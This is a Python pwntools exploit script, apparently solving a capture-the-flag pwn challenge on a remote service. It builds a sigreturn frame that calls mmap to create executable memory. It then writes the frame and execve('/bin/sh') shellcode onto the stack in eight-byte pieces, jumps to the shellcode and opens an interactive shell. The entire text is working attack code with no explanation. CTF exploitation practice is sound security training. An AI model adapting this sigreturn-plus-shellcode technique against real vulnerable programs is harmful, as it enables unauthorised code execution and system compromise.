from pwn import *

r = remote("challs.xmas.htsp.ro", 2002)
#r = process("./main")
#gdb.attach(r)
r.recvuntil(b' (/quit to leave)')

vuln = 0x4010eb
sysreturn = 0x0000000000401199  # mov eax, 0xf ; nop ; syscall
new_mem = 0x1337000
syscall = 0x0000000000401114
syscall_leave_ret = 0x40119f
syscall_jmp = 0x40116f
sh_addr = 0x402006



frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rip = syscall_jmp
frame.rax = 9
frame.rdi = new_mem
frame.rsi = 0x12000
frame.rdx = 7
frame.r10 = 0x21
frame.r8 = 0xffffffff
frame.r9 = 0
frame.rbp = new_mem + 0x1000 + 0x108
frame.rsp = new_mem + 0x1000

frame = bytes(frame)

stack = (0xe8 + 0x10000 - 0x110)//8


# for i in range(stack - len(frame)//8):
# 	print("Lan 1: " + str(i))
# 	r.send("12345678")
# 	r.recvuntil(b' (/quit to leave)')

payload = b"a"*8*8156
r.send(payload)
#r.recvuntil(b' (/quit to leave)')
r.recv()

count = len(frame)
for _ in range(len(frame)//8):
	r.send(frame[count-8:count])
	r.recvuntil(b' (/quit to leave)')
	count -= 8 	

r.send(p64(sysreturn))
r.recvuntil(b' (/quit to leave)')

r.send(b"/quit\n")

shellcode = b"\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
shellcode += b"\x00"*3

for i in range(stack - 0xe8//8 - len(shellcode)//8 - 1):
	print("Lan 2: " + str(i))
	r.send("aaaabbbb")
	r.recvuntil(b' (/quit to leave)')

count = len(shellcode)
for _ in range(len(shellcode)//8):
	r.send(shellcode[count-8:count])
	r.recvuntil(b' (/quit to leave)')
	count -= 8 	

r.send(p64(0x1338118))   # shellcode is here
r.recvuntil(b' (/quit to leave)')

r.sendline(b"/quit")

r.interactive()